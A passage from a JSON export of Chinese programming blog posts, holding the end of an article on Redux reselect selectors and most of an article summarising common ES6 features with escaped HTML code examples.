对应的reselect描述是这样的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { createSelector } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'reselect'\u003c/span\u003e\n\nfSelector = createSelector(\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ea\u003c/span\u003e =\u0026gt;\u003c/span\u003e state.a,\n    b =\u0026gt; state.b,\n    (a, b) =\u0026gt; f(a, b)\n)\nhSelector = createSelector(\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eb\u003c/span\u003e =\u0026gt;\u003c/span\u003e state.b,\n    c =\u0026gt; state.c,\n    (b, c) =\u0026gt; h(b, c)\n)\ngSelector =  createSelector(\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ea\u003c/span\u003e =\u0026gt;\u003c/span\u003e state.a,\n    c =\u0026gt; state.c,\n    (a, c) =\u0026gt; g(a, c)\n)\nuSelector = createSelector(\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ea\u003c/span\u003e =\u0026gt;\u003c/span\u003e state.a,\n    b =\u0026gt; state.b,\n    c =\u0026gt; state.c,\n    (a, b, c) =\u0026gt; u(a, b, c)\n)\n\n...\nfunction mapStateToProps(state) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { a, b, c } = state\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n        a,\n        b,\n        c,\n        \u003cspan class=\"hljs-attr\"\u003efab\u003c/span\u003e: fSelector(state),\n        \u003cspan class=\"hljs-attr\"\u003ehbc\u003c/span\u003e: hSelector(state),\n        \u003cspan class=\"hljs-attr\"\u003egac\u003c/span\u003e: gSelector(state),\n        \u003cspan class=\"hljs-attr\"\u003euabc\u003c/span\u003e: uSelector(state)\n    }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 createSelector 里面我们先定义了 input-selector 函数， 最后定义了 值是如何计算出来的。 selector保证了，当input-selector 返回结果相等的时候，不会计算。 \u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e最后\u003c/h3\u003e\u003cp\u003e如果 你是react-router 并且是 单 容器组件。 那么可能在 mapStateToProps里面计算，性能问题并不大。 而且性能不应该是我们第一要考虑的东西， 我们首先要考虑的是简单性，尤其是组件的简单性。 当我们的业务复杂到需要考虑性能的时候， reselect是我们不错的选择！\u003c/p\u003e\n","buildTime":"1514894585.2029","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c070b"},"id":"59d7790e6fb9a00a496e926a","author":{"$oid":"5a4b76d92239bd131cd79f2b"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"ES6常用知识点概述","meta":{"likeCount":0},"tag":["Promise","JavaScript","API","前端"],"comment":[],"shortContent":"ES6，并不是一个新鲜的东西，ES7、ES8已经赶脚了。但是，东西不在于新，而在于总结。每个学前端的人，身边也必定有本阮老师的《ES6标准入门》或者翻译的《深入理解ECMAScript6》。本篇主要是对ES6的一些常用知识点进行一个总结。如果你喜欢我的文章，欢迎评论，欢迎Sta…","content":"\u003ch1 id=\"-\"\u003e前言\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e国庆假期已过一半，来篇干货压压惊。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eES6，并不是一个新鲜的东西，ES7、ES8已经赶脚了。但是，东西不在于新，而在于总结。每个学前端的人，身边也必定有本阮老师的《ES6标准入门》或者翻译的《深入理解ECMAScript6》。本篇主要是对ES6的一些常用知识点进行一个总结。如果你喜欢我的文章，欢迎评论，欢迎Star~。欢迎关注我的\u003ca href=\"https://github.com/laizimo/zimo-article/issues\"\u003egithub博客\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e正文\u003c/h1\u003e\n\u003cp\u003e我们会更具之前的罗列的内容进行一个深入的分析。\u003c/p\u003e\n\u003ch3 id=\"-let-const\"\u003e变量的新定义——let和const\u003c/h3\u003e\n\u003cp\u003e在ES6没有被普及时，我们会用的变量定义的方法是var。其实，var对于一个刚刚接触js的人说，或许并不觉得怪异。但是，对于一个开发者而言，或许会在内心抨击它。因为它就是javascript的败笔之一，在其他语言看来的一个怪胎。那我们就来看看怪在何处呢？\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e可以重复定义\u003c/strong\u003e。不知道你的代码里面会不会出现这样子的代码，举例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e;\n \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 或许，你会看到这样子的写法觉得没啥，那么你很厉(wei)害(xian)。其实，这样子的坏处不言而喻。在大型的工程化开发中，你定义一个a，我定义一个a，还有千千万万个你和我，这时，技术总监就该着急了。所以，这是var的第一点令人讨厌的地方，但是如果你会说不是有严格模式嘛。的确，严格模式做了一定的规范，但是我们不加以讨论。毕竟，这时ES6的地盘(^-^)。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e可随意修改\u003c/strong\u003e。何为可随意修改？并不是指变量，而是指常量。举例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e PI = \u003cspan class=\"hljs-number\"\u003e3.1415926\u003c/span\u003e\n PI = \u003cspan class=\"hljs-number\"\u003e4.1415926\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 从例子中，我们可以看到，PI是一个我们经常会使用的常量，是公认的不可变动的。但在javascript中并不是如此。那天，如果你的PI被你们公司新晋的实习生改了，可能你找错误都得找半天，但这可不是实习生的锅，也许，他并不知道这里是个常量。不过，这种情况也是玩笑话(^_^)。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e没有块级作用域\u003c/strong\u003e。如果你连块级作用域都不知道的话，赶紧收藏一下^_^，回头再来看哈～，举例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e){\n     \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e;\n }\n \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(i);  \u003cspan class=\"hljs-comment\"\u003e//10\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 相信，这变量不存在块级作用域给我们带来过不少麻烦吧。不知道啥时候，又得在循环中套一层闭包呢。而且，在非js开发者来说，可能觉得是个特(xiao)点(hua)。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e所以，let和const就来拯救var了，如何一个拯救法呢？\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e在同一个块级作用域中，不允许重复定义\u003c/strong\u003e。那之前的例子来使用一下的话，你会发现浏览器报错了，如图：\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"let\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/2f0fb2e7243d5f6f19c2eb8ead022655\"\u003e\u003cfigcaption\u003elet\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003econst定义的变量不允许二次修改\u003c/strong\u003e。还原一下之前的例子，如图：\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"const\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/4665266d3b082f0275c989d96bf8af51\"\u003e\u003cfigcaption\u003econst\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e 是不是再也不用担心之前的实习生啦，呦！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003elet和const定义的变量会形成块级作用域：\u003c/strong\u003e直接上图，看看：\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"块级作用域\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/a670be66e059e8656b71237da148894c\"\u003e\u003cfigcaption\u003e块级作用域\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e它们定义的变量不存在变量提升，以及存在暂时性死区\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e这个问题，我想举个例子可以更加方便的说明。首先，我们来看一题简单的笔试题：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e;\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ehello\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a);\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e;\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a);\n}\nhello();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我想这个答案不言而喻，是undefined和11。原因：就是第一个console时，下面定义的变量a被提升了，所以a变成了undefined，第二个的话，就比较好理解。这个例子，我想会给初学者带来不小的麻烦，和当初的我一样哈。\u003c/p\u003e\n\u003cp\u003e使用let和const就会不一样，它们并不存在变量提升，如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"变量提升\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/4ecd694c1e314bcf5126815afe786715\"\u003e\u003cfigcaption\u003e变量提升\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"-\"\u003e函数的变化——箭头函数，剩余参数，参数默认值\u003c/h3\u003e\n\u003cp\u003e何为箭头函数，我们先上例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e addToCart = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eproductId\u003c/span\u003e =\u0026gt;\u003c/span\u003e (dispatch, getState) =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (getState().products.byId[productId].inventory \u0026gt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n    dispatch(addToCartUnsafe(productId))\n  }\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这是，我从redux例子中摘取的一个片段，第一感觉就是『代码风格简洁』，整体代码规范很好，毕竟是示例代码么。但是会让人难以理解。因此，为了避免以后看不懂的尴尬，还是来好好聊聊这个神奇的东西吧。\u003c/p\u003e\n\u003cp\u003e其实，这个东西类似于python的lambda。但是，它的确特别适合js这门语言，就一个字「酷」。它的几个规则：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e变量如果只有一个的时候，可以省略()\u003c/li\u003e\n\u003cli\u003e如果是只有一句返回语句时，可以直接省略{return   }这一部分\u003c/li\u003e\n\u003cli\u003e因为它本身叫做arrow，所以每次都必须带上=\u0026gt;符号\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e如果你一开始不会写，那就必须得多练习，这样才能在以后的工作中真正谋求便利。\u003c/p\u003e\n\u003cp\u003e当然咯，它有好处，但是在使用的时候，也得注意它的禁区。注意事项：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e箭头函数不能作为构造函数\u003c/strong\u003e。如图：\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"arrow\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/80cab1e89e69343aaa393b871f947d23\"\u003e\u003cfigcaption\u003earrow\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e箭头函数没有它自己的this值，箭头函数内的\u003ccode\u003ethis\u003c/code\u003e值继承自外围作用域\u003c/strong\u003e。如图：\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"arrow\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/2f4ee91258a2802f53abb504c75a4faf\"\u003e\u003cfigcaption\u003earrow\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e箭头函数没有arguments\u003c/strong\u003e。这个我们直接测试一下就可以了，如图：\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"arrow\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/95b20121716122fc48bdbec90ac9f6c4\"\u003e\u003cfigcaption\u003earrow\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e啥？没有arguments，那我如果正好要用到呢？这可咋办呢？下面再来说个有意思的改动——\u003cstrong\u003e剩余参数\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e什么叫剩余参数？别着急，看个例子就懂了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e restParam = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ea, ...args\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(args);\n};\nrestParam(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e);   \u003cspan class=\"hljs-comment\"\u003e//[2, 3, 4]\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里你会发现这个args变量似乎包含了之后输入的所有参数，除了a以外。所以，这就是所谓的剩余参数。其中，运用到了一个\u003ccode\u003e…\u003c/code\u003e这个符号。其实这个符号的用处非常的多，ES6中可以将它称为扩展符。那么，我们来看看在箭头函数中的运用。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"rest param\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/e9b3ec122766f9f71640badb44ea366c\"\u003e\u003cfigcaption\u003erest param\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e当然，在使用剩余参数时，需要注意一个问题，就是\u003cstrong\u003e剩余参数设置的位置\u003c/strong\u003e。我们先来看张图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"参数位置\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/ef694ac4bed57823dc521058b258ba31\"\u003e\u003cfigcaption\u003e参数位置\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e所以，在使用剩余参数时，需要注意的是，将这部分放在所有参数的\u003cstrong\u003e最后位置\u003c/strong\u003e。其实，ES6还带来了另一个参数的变动——\u003cstrong\u003e默认参数\u003c/strong\u003e。或许，我们可以先看一下默认参数这个问题，我们之前是怎么处理的。场景：一般在设置延迟的时候，都会有一个时间的默认值，防止用户在没有设置的情况下使用，看看下面的例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edefaultParam\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003etime\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e wait = time || \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e;\n      setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n    }, wait);\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种写法应该非常的常见，使用的也比较广泛。但是，使用ES6的语法的话，就会变成这样子，例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edefaultParam\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003etime = \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\u003c/span\u003e)\u003c/span\u003e{\n    setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n    }, time);\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看上去这样子的写法，会使得函数更加的简洁明了。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e数组——解构赋值、二进制数组\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e说到解构赋值呢？大家千万别误解为这是数组的特性。不是的，对象也能够满足。只是觉得放在这边来写会比较好而已\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e解构赋值这个新特性，说实话是真的好用。我们可以先来看一个复杂一点的例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e [a, b , {name, age}, ...args ] = [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'zimo'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eage\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e}, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e];\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a, b, name, age, args); \u003cspan class=\"hljs-comment\"\u003e//1, 2, 'zimo', 24, [3, 4]\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e你会发现例子中，有一个特点——\u003cstrong\u003e对仗工整\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e这是解构赋值时，必须要去满足的条件——\u003cstrong\u003e想要解构的部分，内容保持一致\u003c/strong\u003e。这样才能保证完美解构。对于解构而言，左右两边的内容长度不一致，不会出问题。比如，当你右边内容多一点的时候，其实没啥事，你只需要保证你左边的结构有一部分是你想要的，举例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e [a, b, c] = [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e];\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a, b, c); \u003cspan class=\"hljs-comment\"\u003e//1, 2, 3\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种叫做部分解构，左边也是一样的，对于多处来的部分，会变成undefined。举例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e [a,b,c] = [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e];\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a, b, c);  \u003cspan class=\"hljs-comment\"\u003e//1 2 undefined\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e解构赋值在使用过程中，也是有需要注意的部分：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e必须保证有赋值的过程\u003c/strong\u003e。看个例子：\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"解构赋值\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/dd437a39aa760a86119524bfa7de36a2\"\u003e\u003cfigcaption\u003e解构赋值\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e 你可以看到图中的例子，单独先声明了a和b，但是没有赋值的过程，会报错。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e左边内容部分的结构必须与右边保持一致\u003c/strong\u003e。如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"解构赋值\" src=\"https://user-gold-cdn.xitu.io/2017/10/6/d2237ae367f106e39f7dbdf56d5bdf5a\"\u003e\u003cfigcaption\u003e解构赋值\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这里两边的结构没有一致，如果是foo,bar的话，是可以正常解构的。但是这个例子的意图可能是想去解构foo中的值，但是写法上有一定的问题。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e其实，解构也有没多种玩法：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e默认值的使用\u003c/strong\u003e。由于之前说过的部分解构的情况出现，所以我们在解构时，可以使用默认值的形式。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e [a, b = \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e] = [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e];\n \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a, b);  \u003cspan class=\"hljs-comment\"\u003e//1, 10\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 在这个例子中b原先是undefined，但是设置了默认值的情况下，undefined的变量会被赋上默认值\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003e函数变量中使用解构\u003c/strong\u003e。对于一个函数而言，它的参数也可能会是数组或对象，这是我们就可以使用解构赋值的方式\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edestructuring\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e{name, age}\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(name, age);\n}\ndestructuring({\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'zimo'\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eage\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e}); \u003cspan class=\"hljs-comment\"\u003e// zimo 21\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e解构赋值现在被使用的频率也是非常之大，好好掌握一下也是有必要的。\u003c/p\u003e\n\u003cp\u003e之后的话，我们可以聊一下二进制数组的概念。\u003c/p\u003e\n\u003cp\u003e何为二进制数组？其实，我们可以先来了解一下javascript的数组。熟悉js的人都知道，其实js的数组的性能并不高，它的本质是一个对象。之所以现在你看到数组在使用时速度还可以，是因为js的引擎在处理时，做了不同的优化。拿v8引擎举例的话，对于内部元素类型相同的数组在编译运行的时候，会使用c编译器。如果对于内部元素类型不同的时候，它会先将数组分离开来，然后再进行编译。具体可以查看\u003ca href=\"http://www.wemlion.com/post/javascript-array-evolution-performance/\"\u003e深入 JavaScript 数组：进化与性能\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e所以，我们可以直接了解一下二进制数组的使用。二进制数组可以由Int8Array、Int16Array、Int32Array等形式组成，在整数方面，可用性较强。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e buffer = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Buffer(\u003cspan class=\"hljs-number\"\u003e100000000\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arr = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eInt8Array\u003c/span\u003e(buffer);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.time(\u003cspan class=\"hljs-string\"\u003e'test time'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; arr.length; i++){\n    arr[i] = i;\n}\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.timeEnd(\u003cspan class=\"hljs-string\"\u003e'test time'\u003c/span\u003e);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实，现在二进制数组使用的频率并不多，ES6也仅仅是提出，后续还会对数组这一块进行一个更加详细的完善。\u003c/p\u003e\n\u003ch3 id=\"-startswith-endswidth\"\u003e字符串——模版字符串、startsWith、endsWidth\u003c/h3\u003e\n\u003cp\u003e在ES6中，对字符串也做了一定的改进。先来聊聊我们的新朋友——模版字符串。其实，在语言中，字符串有多种表示方式：单引号、双引号和倒引号。在javascript中，双引号和单引号都是一样的，这点与一些静态语言不一样。但是，往往有时候，对于字符串的拼接会使得开发者厌烦。如何解决呢？\u003c/p\u003e\n\u003cp\u003eES6带来了解决方案——模版字符串。何为模版字符串呢？由倒引号包裹``，然后使用${}来包裹变量。我们可以来实践一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e name=\u003cspan class=\"hljs-string\"\u003e\"zimo\"\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e str = \u003cspan class=\"hljs-string\"\u003e`My name is \u003cspan class=\"hljs-subst\"\u003e${name}\u003c/span\u003e`\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(str);  \u003cspan class=\"hljs-comment\"\u003e//My name is zimo\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样，我们就可以非常方便的在其中添加变量了。或许，你会觉得这样的拼接，使用普通的方式也可以非常好的完成。但是，在开发过程中，我们或许会碰到更佳复杂的情况，比如说，我们现在要去创建一个DOM元素，以及它的内部元素。这种情况，通常还会带有表达式。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e width = \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e height = \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e src = \u003cspan class=\"hljs-string\"\u003e\"http://www.example.com/example.png\"\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e html = \u003cspan class=\"hljs-string\"\u003e`\u0026lt;div class=\"block\" width=\"\u003cspan class=\"hljs-subst\"\u003e${\u003cspan class=\"hljs-number\"\u003e0.5\u003c/span\u003e * width}\u003c/span\u003epx\" height=\"\u003cspan class=\"hljs-subst\"\u003e${height}\u003c/span\u003e\"\u0026gt;\u0026lt;img src=\"\u003cspan 